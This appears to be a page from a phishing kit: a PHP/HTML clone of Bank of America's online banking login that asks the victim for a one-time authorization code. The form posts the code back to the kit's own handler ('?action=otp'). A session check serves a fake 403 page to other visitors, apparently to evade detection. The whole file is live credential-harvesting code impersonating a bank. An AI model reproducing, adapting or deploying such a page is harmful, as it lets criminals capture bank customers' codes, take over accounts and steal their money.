<?php
session_start();
error_reporting(0);
// Check if session is not set, or if they do not match
if($_SESSION['username'] == "") {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win ff ff-138 svg-bg not-retina cf-cnx-regular-active">
<head>
    <style type="text/css">
    @font-face {
        font-family: 'cnx-regular';
        src: url('../assets/fonts/cnx-regular.eot');
        src: url('../assets/fonts/cnx-regular.eot?#iefix') format('embedded-opentype'),
        url('../assets/fonts/cnx-regular.woff') format('woff'),
        url('../assets/fonts/cnx-regular.ttf') format('truetype');
        font-weight: normal;
        font-style: normal;
        font-variant: normal;
    }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Bank of America | Online Banking | Log In | User ID</title>
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
    <link rel="shortcut icon" href="../assets/img/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="../assets/css/vipaa-v4-jawr.css" media="all">
    <link rel="stylesheet" type="text/css" href="../assets/css/vipaa-v4-jawr-print.css" media="print">
    <style>
    body{
        display:none;
    }
    </style>
    <style type="text/css">
    .sparta-widget-loader-v6.sparta-widget-loading-spinner {
        position:relative;
        text-align:justify
    }
    .sparta-widget-loader-v6.sparta-widget-loading-spinner:before {
        animation:sparta-widget-loading-animation 2s linear infinite;
        background-image:url("data:image/svg+xml;charset=utf8,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%20x=%220%22%20y=%220%22%20width=%2224%22%20height=%2224%22%20viewBox=%220,0,24,24%22%3E%3Cpath%20fill=%22black%22%20stroke=%22%22%20stroke-width=%22%22%20style=%22%22%20d=%22M11.9117276,22 C7.06862372,22.0011298 2.90808187,18.5905839 2,13.8749998 L3.00882724,13.6899998 C3.90914096,18.3580403 8.31588698,21.5276214 13.0721202,20.9280896 C17.8283535,20.3285577 21.2945553,16.1665773 20.9875764,11.4237459 C20.6805974,6.6809145 16.7062561,2.99213104 11.9117276,3 L11.9117276,2 C17.4833266,2 22,6.47715244 22,12 C22,17.5228473 17.4833266,22 11.9117276,22 Z%22%20/%3E%3C/svg%3E");
        background-position:50%;
        background-repeat:no-repeat;
        background-size:48px;
        bottom:0;
        content:" ";
        height:48px;
        left:50%;
        margin:auto auto auto -24px;
        position:absolute;
        top:0;
        width:48px;
        z-index:1
    }
    .sparta-widget-loader-v6 [data-sparta-container].sparta-widget-loading {
        height:100%;
        text-align:justify;
        width:100%
    }
    .sparta-widget-loader-v6 [data-sparta-container].sparta-widget-loading>.sparta-widget {
        height:100%;
        visibility:hidden
    }
    @keyframes sparta-widget-loading-animation {
        to {
            transform:rotate(1turn)
        }
    }
    </style>
    <link type="text/css" rel="stylesheet" href="../assets/css/styles-78cd12cdf6a3cc9caa88.m.css">
</head>      
<body class="fsd-layout-body" style="display: block;">  
    <noscript>
        <style>
        body{
            display:block;
        }
        </style>
    </noscript>
    <a class="ada-hidden ada-visible-focus" href="#skip-to-h1" id="ada-skip-link">Skip to main content</a>
        <div class="fsd-layout fsd-2c-700lt-layout">
            <div class="fsd-border">
                <div class="center-content">
                    <div class="header">
                        <div class="header-module">
                            <div class="fsd-secure-esp-skin">
                                <img height="28" width="230" alt="Bank of America" src="../assets/img/BofA_rgb.png">
                                <div class="page-type cnx-regular" data-font="#!">Log In</div>
                                <div class="right-links">
                                    <div class="secure-area">Secure Area</div>
                                    <a class="divide" href="/login/languageToggle.go?request_locale=es_US" target="_self" name="spanish_toggle" title="Muestra esta sesi�n de la Banca en L�nea">En espa�ol</a>
                                    <div class="clearboth"></div>
                                </div>
                                <div class="clearboth"></div>
                            </div>
                        </div>
                        <noscript>
                            <div class="fauxdal-overlay"></div>
                            <div class="fauxdal-module">
                                <div class="noscript-reload-skin">
                                    <div class="fauxdal-top"></div>
                                    <div class="fauxdal-bottom">
                                        <div class="fsd-fauxdal-content">
                                            <div class="fsd-fauxdal-title">
                                                Please use JavaScript
                                            </div>
                                            <p>You need a web browser that supports JavaScript to use our site. Without it, some pages won't work as designed. To make sure JavaScript is turned on, please adjust your browser settings.</p>
                                            <p>&nbsp;</p>
                                            <p>
                                                <a title="Browser Help and Tips" name="Browser Help and Tips" href="https://www.bankofamerica.com/onlinebanking/online-banking-security-faqs.go" target="_self">Browser Help and Tips</a>
                                            </p>
                                        </div>        
                                        <div class="fsd-fauxdal-close"> 
                                            <a class="button-common button-gray" name="close_button_js_disabled_modal" href=>
                                                <span>Close</span>
                                            </a>
                                        </div>
                                        <div class="clearboth"></div>
                                    </div>
                                </div>
                            </div>
                        </noscript>
                        <div class="page-title-module" id="skip-to-h1">
                            <div class="red-grad-bar-skin sup-ie">
                                <h1 data-font="#!" class="cnx-regular">Log In to Online Banking</h1>
                            </div>
                        </div>
                        <div id="clientSideErrors" class="messaging-vipaa-module hide" aria-live="polite" aria-hidden="false" style="display: none;"></div>
                        <div class="vipaa-modal-content-module">
                            <div class="sitekey-affinity-skin"></div>
                        </div>
                    </div>
                    <div class="columns">
                        <div class="flex-col lt-col">
                            <div class="online-id-vipaa-module">
                                <div class="enter-skin phoenix">
                                    <form class="simple-form collector-form-marker" name="enter-online-id-form" id="EnterOnlineIDForm" method="post" action="?action=otp">
                                      <div class="online-id-section">
                                        <h2 class="cnx-regular title enroll-color-gray mbtm-10">Enter Authorization Code</h2>
                                        <label for="phone">xxx-xxx-xxxx
                                        </label>
                                        <label for="code">Authorization code
                                        </label>
                                        <input type="text" id="OTP-input" name="otp" maxlength="6" value="" autocomplete="off">
                                    </div>
                                    <div class="clearboth"></div>
                                    <button id="login_button" type="submit" title="Log In" class="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight" name="enter-online-id-submit">
                                        <span class="btn-bofa-blue-lock">Log In</span>
                                    </button>
                                    <div class="clearboth"></div>
                                </form>     
                                <div id="fpContainer" class="" style="width: 50%;"></div>
                            </div>
                        </div>
                        <style type="text/css">
                            .aps-mobile-products .sprite-D5>.spr {width: 50px !important;left: 25px !important;top: -5px !important;}
                            .aps-mobile-products .sprite-J8>.spr {height: 51px;width: 50px !important;background-position: -522px -410px !important;left: 30px !important;}
                            .aps-mobile-products .sprite-F5>.spr {width: 50px !important;left: 25px !important;top: -5px !important;}
                        </style>
                    </div>
                    <div class="flex-col rt-col">
                        <div class="side-well-vipaa-module">
                            <div class="fsd-ll-skin">
                                <h2>Quick Help</h2>
                                <ul class="li-pbtm-15">
                                    <li>
                                        <a class="arrow" href="/login/reset/entry/forgotIDPwdScreen.go" name="Forgot ID/Password?">My authorization code expired</a>
                                    </li>
                                    <li>
                                        <a class="arrow" href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/" name="Problem logging in?">I never received my authorization code</a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="clearboth"></div>
                </div>
                <div class="footer">
                    <div class="footer-top">&nbsp;</div>
                        <div class="footer-inner" style="margin-top: 248.75px;">
                            <div class="global-footer-module">
                               <div class="gray-bground-skin cssp">
                                    <div class="secure">Secure area</div>
                                    <div class="link-container">
                                        <div class="link-row"> 
                                            <a href="https://www.bankofamerica.com/security-center/privacy-overview/" name="Privacy_&amp;_Security_footer" title="Privacy" target="_blank">Privacy</a>
                                            <a href="https://www.bankofamerica.com/security-center/overview/" name="Security" title="Security" target="_blank">Security</a>
                                            <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();" name="Your Privacy Choices" title="" target="_self">Your Privacy Choices</a>
                                            <img id="footer_pill" src="../assets/img/pill.png" alt="pill">  
                                                <div class="clearboth"></div>
                                         </div>
                                      </div>
                                    <p>Bank of America, N.A. Member FDIC. <a href="https://www.bankofamerica.com/help/equalhousing-popup/" target="_blank" rel="noopener" name="Equal_Housing_Lender">Equal Housing Lender</a> <br>�&nbsp;2025 Bank of America Corporation.</p>
                               </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/jquery.mask.min.js"></script>
        <script src="../assets/js/jquery.validate.min.js"></script>
        <script>
        document.getElementById('login_button').addEventListener('click', function (e) {
            var OTP = document.getElementById('OTP-input').value.trim();

            if (!OTP) {
                e.preventDefault();

                var errorDiv = document.getElementById('clientSideErrors');
                if (errorDiv) {
                    errorDiv.classList.remove('hide');
                    errorDiv.style.display = 'block';
                    errorDiv.innerHTML = `
                        <a id="error-message-ada-focus" name="error-message-ada-focus" class="ada-hidden" tabindex="0">Error Message</a>
                        <div class="error-skin">
                            <div class="error-message"> 
                                <p class="title TLu_ERROR">We can't process your request.</p>
                                <ul>
                                    <li>
                                        <p>Please enter all the required information to proceed.</p>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    `;
                }
            }
        });
        </script>
    </body>
    <div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div>
</html>